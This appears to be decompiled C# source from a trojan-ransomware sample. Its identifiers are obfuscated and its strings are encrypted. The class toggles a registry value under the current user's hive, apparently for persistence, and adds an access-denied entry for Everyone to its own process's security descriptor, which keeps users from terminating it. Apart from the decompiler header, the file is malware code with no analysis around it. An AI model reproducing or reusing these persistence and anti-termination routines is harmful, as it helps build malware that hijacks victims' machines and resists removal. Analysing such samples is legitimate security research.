// Decompiled with JetBrains decompiler
// Type: sWduCclqEzKrM.uxNXrlnnpxw
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B0EDCE10-9F20-42C9-8790-E70D370F9841
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.Win32.Generic-9bf0633f41d2962ba5e2895ece2ef9fa7b546ada311ca30f330f0d261a7fb184.exe

using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace sWduCclqEzKrM
{
  internal sealed class uxNXrlnnpxw
  {
    [NonSerialized]
    internal static GetString \u0095;

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    private static extern bool EKiqGLhYBOPW(
      IntPtr vksBUwvyFGq,
      int RbzdEFIadihSsGhv,
      [Out] byte[] WKuTojexwAQ,
      uint sHRxlbXFjgyK,
      out uint xfDDGLDrOpls);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    private static extern bool zsXtFMUtPDGE(
      IntPtr vOSuDumHAL,
      int wyPnOSRxwgofs,
      [In] byte[] BtAGyDQURmvjVs);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr tUopaLwZwaJEgEvyk();

    public void cWimzuuzJCxC([In] bool obj0)
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(wJkbnIWOteHAMM.AJakXHzLGH(uxNXrlnnpxw.\u0095(107379833)));
        if (obj0 && subKey.GetValue(wJkbnIWOteHAMM.AJakXHzLGH(uxNXrlnnpxw.\u0095(107379728))) != null)
          subKey.DeleteValue(wJkbnIWOteHAMM.AJakXHzLGH(uxNXrlnnpxw.\u0095(107379728)));
        else
          subKey.SetValue(wJkbnIWOteHAMM.AJakXHzLGH(uxNXrlnnpxw.\u0095(107379728)), (object) uxNXrlnnpxw.\u0095(107396676));
        subKey.Close();
      }
      catch
      {
      }
    }

    private RawSecurityDescriptor hcUpByLDINcBM([In] IntPtr obj0)
    {
      byte[] WKuTojexwAQ = new byte[0];
      uint xfDDGLDrOpls;
      uxNXrlnnpxw.EKiqGLhYBOPW(obj0, 4, WKuTojexwAQ, 0U, out xfDDGLDrOpls);
      if (xfDDGLDrOpls < 0U || xfDDGLDrOpls > (uint) short.MaxValue)
        return (RawSecurityDescriptor) null;
      byte[] binaryForm;
      return !uxNXrlnnpxw.EKiqGLhYBOPW(obj0, 4, binaryForm = new byte[(IntPtr) xfDDGLDrOpls], xfDDGLDrOpls, out xfDDGLDrOpls) ? (RawSecurityDescriptor) null : new RawSecurityDescriptor(binaryForm, 0);
    }

    private void BMxgTfKYapV([In] IntPtr obj0, [In] RawSecurityDescriptor obj1)
    {
      byte[] numArray = new byte[obj1.BinaryLength];
      obj1.GetBinaryForm(numArray, 0);
      uxNXrlnnpxw.zsXtFMUtPDGE(obj0, 4, numArray);
    }

    public void aXczjuKTuSPGGf()
    {
      try
      {
        IntPtr num = uxNXrlnnpxw.tUopaLwZwaJEgEvyk();
        RawSecurityDescriptor securityDescriptor = this.hcUpByLDINcBM(num);
        securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null));
        this.BMxgTfKYapV(num, securityDescriptor);
      }
      catch (Exception ex)
      {
      }
    }

    static uxNXrlnnpxw() => Strings.CreateGetStringDelegate(typeof (uxNXrlnnpxw));
  }
}
